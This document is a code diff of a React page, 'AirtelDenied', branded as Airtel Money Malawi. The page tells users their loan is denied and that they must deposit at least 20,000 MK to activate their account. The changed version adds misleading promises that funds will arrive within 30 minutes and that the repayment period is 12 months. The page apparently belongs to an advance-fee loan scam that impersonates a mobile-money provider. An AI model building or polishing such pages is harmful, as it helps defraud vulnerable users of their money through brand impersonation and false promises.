@@ -1,167 +1,98 @@
-import React, { useState, useEffect } from 'react';
+import React, { useEffect, useState } from 'react';
 import { useNavigate } from 'react-router-dom';
-import { useLanguage } from './LanguageContext';
 
 function AirtelDenied() {
   const navigate = useNavigate();
-  const { language, setLanguage, t } = useLanguage();
-
   const [loanAmount, setLoanAmount] = useState('0');
-  const REQUIRED_DEPOSIT = 20000; // ✅ Malawi minimum deposit (MK)
+  const REQUIRED_DEPOSIT = 20000; // 20,000 MK
 
   useEffect(() => {
     const savedAmount = localStorage.getItem('airtelLoanAmount');
-    if (savedAmount) {
-      setLoanAmount(Number(savedAmount).toLocaleString('en-US'));
-    }
+    if (savedAmount) setLoanAmount(Number(savedAmount).toLocaleString('en-US'));
   }, []);
 
   const handleClearAndNavigate = () => {
-    localStorage.removeItem('airtelPhone');
-    localStorage.removeItem('airtelLoanAmount');
-    localStorage.removeItem('airtelPendingRequest');
+    localStorage.clear();
     navigate('/');
   };
 
-  const depositLabel = REQUIRED_DEPOSIT.toLocaleString('en-US');
-
   return (
-    <div className="airtel-page-container">
+    <div className="page-wrapper">
       <style>{`
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-        .airtel-page-container { display: flex; flex-direction: column; min-height: 100vh; background-color: #DA1C1C; position: relative; }
-        .header-section { padding: 40px 24px 30px; display: flex; flex-direction: column; align-items: center; position: relative; }
-        .menu-btn { position: absolute; left: 20px; top: 20px; background: none; border: none; cursor: pointer; padding: 8px; }
-        .lang-selector { position: absolute; right: 20px; top: 20px; padding: 8px 12px; border-radius: 8px; border: 1px solid rgba(0,0,0,0.1); background-color: rgba(255, 255, 255, 0.2); font-weight: 700; color: #1a1a1a; cursor: pointer; outline: none; }
-        .lang-selector option { color: #000; }
-        .header-title { font-size: 32px; font-weight: 900; color: #1a1a1a; font-style: italic; margin-bottom: 6px; }
-        .header-subtitle { font-size: 14px; font-weight: 600; color: #1a1a1a; }
-        .main-card { background-color: #ffffff; width: 90%; max-width: 420px; margin: 0 auto; border-radius: 24px; padding: 32px 24px; display: flex; flex-direction: column; align-items: center; box-shadow: 0 10px 25px rgba(0,0,0,0.1); position: relative; z-index: 10; }
-        .denied-icon-wrapper { display: flex; align-items: center; justify-content: center; width: 80px; height: 80px; border-radius: 50%; background-color: #FEF2F2; margin-bottom: 20px; }
-        .title { font-size: 26px; font-weight: 800; color: #0F172A; margin-bottom: 12px; text-align: center; }
-        .subtitle { font-size: 15px; color: #64748B; margin-bottom: 24px; text-align: center; line-height: 1.5; }
-        .subtitle strong { color: #0F172A; }
-        .inactive-box { background-color: #FEF2F2; border: 1px solid #FCA5A5; border-radius: 16px; padding: 24px; width: 100%; display: flex; flex-direction: column; align-items: center; margin-bottom: 24px; text-align: center; }
-        .inactive-title { display: flex; align-items: center; gap: 8px; font-weight: 800; color: #DA1C1C; font-size: 16px; margin-bottom: 12px; }
-        .inactive-text { font-size: 14px; color: #4B5563; line-height: 1.5; margin-bottom: 8px; }
-        .inactive-amount { font-size: 32px; font-weight: 900; color: #0F172A; margin-bottom: 8px; }
-        .checklist-box { background-color: #F8FAFC; border: 1px solid #F1F5F9; border-radius: 16px; padding: 20px; width: 100%; margin-bottom: 24px; display: flex; flex-direction: column; gap: 12px; }
-        .checklist-item { display: flex; align-items: flex-start; gap: 12px; font-size: 14px; color: #475569; line-height: 1.4; }
-        .checkmark { color: #16A34A; font-weight: bold; font-size: 16px; line-height: 1; }
-        .primary-btn { width: 100%; padding: 18px; border-radius: 12px; border: none; background-color: #F87171; color: #0F172A; font-size: 16px; font-weight: 800; cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 12px; transition: all 0.2s; margin-bottom: 16px; }
-        .primary-btn:active { background-color: #EF4444; }
-        .secondary-btn { background: none; border: none; color: #64748B; font-size: 15px; font-weight: 600; cursor: pointer; text-decoration: underline; padding: 8px; }
-        .brand-icons-footer { flex: 1; display: flex; justify-content: center; align-items: center; gap: 16px; padding: 40px 20px 20px; }
-        .brand-icon { display: flex; align-items: center; justify-content: center; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background-color: #DA1C1C; }
+        .page-wrapper { display: flex; flex-direction: column; min-height: 100vh; background-color: #DA1C1C; align-items: center; position: relative; }
+        .header-top { width: 100%; padding: 16px 20px; display: flex; align-items: center; justify-content: center; position: relative; color: #1a1a1a; }
+        .header-title { font-size: 22px; font-weight: 900; }
+        .header-sub { color: #1a1a1a; font-size: 12px; text-align: center; margin-bottom: 24px; font-weight: 500; }
+        
+        .card { background: #fff; width: 92%; max-width: 420px; border-radius: 24px; padding: 32px 24px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); margin-bottom: 24px; z-index: 10; display: flex; flex-direction: column; align-items: center; }
+        
+        .icon-wrapper { width: 64px; height: 64px; border-radius: 50%; border: 3px solid #DA1C1C; display: flex; align-items: center; justify-content: center; margin-bottom: 20px; color: #DA1C1C; font-size: 32px; font-weight: 900; }
+        
+        .card-title { font-size: 24px; font-weight: 900; color: #1a1a1a; margin-bottom: 8px; text-align: center; }
+        .card-sub { font-size: 14px; color: #6B7280; margin-bottom: 24px; text-align: center; }
+        
+        .alert-box { background: #FEF2F2; border: 1px solid #FECACA; border-radius: 12px; padding: 20px; width: 100%; margin-bottom: 24px; text-align: center; }
+        .alert-header { display: flex; align-items: center; justify-content: center; gap: 8px; font-weight: 700; color: #1a1a1a; margin-bottom: 12px; font-size: 15px; }
+        .alert-icon { color: #DA1C1C; font-size: 18px; }
+        .alert-text { font-size: 13px; color: #4B5563; line-height: 1.5; margin-bottom: 8px; }
+        .amount-highlight { font-size: 32px; font-weight: 900; color: #16A34A; margin-bottom: 8px; }
+        
+        .checklist-box { background: #FEF2F2; border: 1px solid #FECACA; border-radius: 12px; padding: 16px; width: 100%; margin-bottom: 24px; text-align: left; }
+        .check-item { display: flex; align-items: flex-start; gap: 8px; font-size: 13px; color: #1a1a1a; margin-bottom: 8px; font-weight: 600; }
+        .check-item:last-child { margin-bottom: 0; }
+        .check-mark { color: #1a1a1a; font-weight: 900; }
+        
+        .btn { width: 100%; padding: 16px; border-radius: 8px; border: none; font-size: 16px; font-weight: 700; display: flex; align-items: center; justify-content: center; gap: 8px; cursor: pointer; transition: 0.2s; background: #F87171; color: #1a1a1a; }
+        .btn:active { background: #EF4444; }
+        
+        .bottom-brands { display: flex; gap: 16px; margin-top: auto; padding-bottom: 32px; }
+        .brand-icon { width: 40px; height: 40px; display: flex; align-items: center; justify-content: center; }
       `}</style>
 
-      <div className="header-section">
-        <button className="menu-btn" onClick={handleClearAndNavigate}>
-          <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#000" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
-            <line x1="3" y1="12" x2="21" y2="12"></line>
-            <line x1="3" y1="6" x2="21" y2="6"></line>
-            <line x1="3" y1="18" x2="21" y2="18"></line>
-          </svg>
-        </button>
-
-        {/* Language selector: English + Chichewa (Malawi) */}
-        <select
-          className="lang-selector"
-          value={language}
-          onChange={(e) => setLanguage(e.target.value as any)}
-        >
-          <option value="en">🇲🇼 English</option>
-          <option value="ny">🇲🇼 Chichewa</option>
-        </select>
-
-        <h1 className="header-title">{t('brandTitle') || 'Airtel Money'}</h1>
-        <p className="header-subtitle">{t('brandSubtitle') || 'Malawi'}</p>
+      <div className="header-top">
+        <h1 className="header-title">Airtel Malawi</h1>
       </div>
+      <p className="header-sub">Quick loans. Anytime. Anywhere.</p>
 
-      <div className="main-card">
-        <div className="denied-icon-wrapper">
-          <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#DA1C1C" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
-            <circle cx="12" cy="12" r="10"></circle>
-            <line x1="12" y1="8" x2="12" y2="12"></line>
-            <line x1="12" y1="16" x2="12.01" y2="16"></line>
-          </svg>
-        </div>
+      <div className="card">
+        <div className="icon-wrapper">!</div>
+        
+        <h2 className="card-title">Loan Denied!</h2>
+        <p className="card-sub">Your loan has been denied.</p>
 
-        <h2 className="title">{t('loanDenied') || 'Loan Request Denied'}</h2>
-
-        <p className="subtitle">
-          {t('deniedSubtitle') || 'Your loan request for'} <strong>{loanAmount} MK</strong>{' '}
-          {t('deniedReason') || 'could not be approved at this time.'}
-        </p>
-
-        <div className="inactive-box">
-          <div className="inactive-title">
-            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#DA1C1C" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-              <rect x="2" y="5" width="20" height="14" rx="2"></rect>
-              <line x1="2" y1="10" x2="22" y2="10"></line>
-            </svg>
-            {t('inactiveMoney') || 'Inactive Money Account'}
+        <div className="alert-box">
+          <div className="alert-header">
+            <svg className="alert-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><rect x="2" y="5" width="20" height="14" rx="2"></rect><line x1="2" y1="10" x2="22" y2="10"></line></svg>
+            Airtel inactive
           </div>
-          <p className="inactive-text">{t('depositAmount') || 'You need to deposit a minimum of'}</p>
-          <p className="inactive-amount">{depositLabel} MK</p>
-          <p className="inactive-text">
-            {t('depositSub') || 'to activate your account and qualify for a loan.'}
-          </p>
+          <p className="alert-text">Please deposit at least</p>
+          <p className="amount-highlight">{REQUIRED_DEPOSIT.toLocaleString()} MK</p>
+          <p className="alert-text">into your Airtel account to activate it and make a new request.</p>
         </div>
 
         <div className="checklist-box">
-          <div className="checklist-item">
-            <span className="checkmark">✓</span>
-            {t('noFundsDeducted') || 'No funds have been deducted from your account.'}
+          <div className="check-item">
+            <span className="check-mark">✔</span> Funds will be transferred to your account within 30 minutes.
           </div>
-          <div className="checklist-item">
-            <span className="checkmark">✓</span>
-            {t('applyAgain') || 'You can apply again after depositing'} <strong>{depositLabel} MK</strong>.
+          <div className="check-item">
+            <span className="check-mark">✔</span> Loan repayment period: 12 months
           </div>
         </div>
 
-        <button className="primary-btn" onClick={handleClearAndNavigate}>
-          {t('returnDashboard') || 'Return to Dashboard'}
-          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
-            <line x1="5" y1="12" x2="19" y2="12" />
-            <polyline points="12 5 19 12 12 19" />
-          </svg>
-        </button>
-
-        <button className="secondary-btn" onClick={handleClearAndNavigate}>
-          {t('backToLogin') || 'Back to Login'}
+        <button className="btn" onClick={handleClearAndNavigate}>
+          Go to dashboard →
         </button>
       </div>
 
-      <div className="brand-icons-footer">
-        <div className="brand-icon">
-          <div style={{ width: '32px', height: '52px', border: '2px solid #E5E7EB', backgroundColor: '#fff', borderRadius: '6px', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', position: 'relative' }}>
-            <div style={{ width: '12px', height: '12px', backgroundColor: '#000', borderRadius: '50%', marginBottom: '4px' }}></div>
-            <span style={{ fontSize: '9px', fontWeight: 'bold', color: '#000' }}>Airtel</span>
-          </div>
+      <div className="bottom-brands">
+        <div className="brand-icon" style={{background: '#fff', borderRadius: '8px', border: '2px solid #ccc', color: '#DA1C1C', fontWeight: 'bold', fontSize: '10px'}}>D-<br/>Money</div>
+        <div className="brand-icon" style={{color: '#1E293B'}}>
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C9.243 2 7 4.243 7 7v3H6a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8a2 2 0 0 0-2-2h-1V7c0-2.757-2.243-5-5-5zm-3 5c0-1.654 1.346-3 3-3s3 1.346 3 3v3H9V7zm4 9h-2v-2h2v2z"/></svg>
         </div>
-
-        <div className="brand-icon">
-          <div style={{ width: '36px', height: '48px', backgroundColor: '#1E293B', borderRadius: '8px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
-            <svg width="18" height="18" viewBox="0 0 24 24" fill="#FCD34D" stroke="#D97706" strokeWidth="1.5">
-              <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
-              <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
-            </svg>
-          </div>
-        </div>
-
-        <div className="brand-icon">
-          <div style={{ width: '32px', height: '20px', backgroundColor: '#FCD34D', borderRadius: '3px', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', border: '1px solid #D97706' }}>
-            <span style={{ fontSize: '8px', fontWeight: '900', color: '#B45309', lineHeight: '1' }}>Airtel</span>
-            <span style={{ fontSize: '8px', fontWeight: '900', color: '#B45309', lineHeight: '1' }}>Money</span>
-          </div>
-        </div>
-
-        <div className="brand-icon">
-          <div style={{ width: '36px', height: '36px', backgroundColor: '#FCD34D', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', border: '2px solid #F59E0B' }}>
-            <span style={{ fontSize: '18px', fontWeight: '900', color: '#78350F' }}>₣</span>
-          </div>
-        </div>
+        <div className="brand-icon" style={{color: '#FCD34D', background: '#1E293B', borderRadius: '4px', fontSize: '10px', fontWeight: 'bold'}}>Airtel<br/>Money</div>
+        <div className="brand-icon" style={{color: '#FCD34D', border: '2px solid #D97706', borderRadius: '50%', fontSize: '18px', fontWeight: '900'}}>K</div>
       </div>
     </div>
   );
